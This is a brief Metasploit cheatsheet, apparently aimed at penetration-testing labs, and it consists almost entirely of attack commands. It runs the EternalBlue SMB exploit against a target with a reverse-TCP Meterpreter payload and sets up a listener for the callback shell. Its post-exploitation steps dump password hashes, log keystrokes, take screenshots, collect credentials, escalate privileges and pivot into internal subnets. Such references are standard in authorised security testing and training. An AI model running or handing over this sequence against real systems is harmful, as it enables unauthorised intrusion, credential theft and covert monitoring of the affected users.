# Metasploit Framework Cheatsheet

## Starting
```bash
msfconsole
```

## Search & Use
```bash
search type:exploit platform:windows smb
use exploit/windows/smb/ms17_010_eternalblue
info
show options
```

## Set Options
```bash
set RHOSTS 10.10.10.5
set LHOST tun0
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
```

## Meterpreter Commands
```bash
sysinfo
getuid
getsystem
hashdump
shell
upload /path/to/file
download C:\file.txt
screenshot
keyscan_start
keyscan_dump
ps
migrate PID
```

## Post-Exploitation
```bash
run post/multi/recon/local_exploit_suggester
run post/windows/gather/credentials/credential_collector
run autoroute -s 10.10.10.0/24
```

## Handlers
```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
run -j
```

## Useful Modules
| Module | Purpose |
|--------|---------|
| auxiliary/scanner/portscan/tcp | Port scanning |
| auxiliary/scanner/smb/smb_version | SMB enumeration |
| auxiliary/scanner/http/http_version | HTTP version detection |
| post/multi/manage/shell_to_meterpreter | Upgrade shell |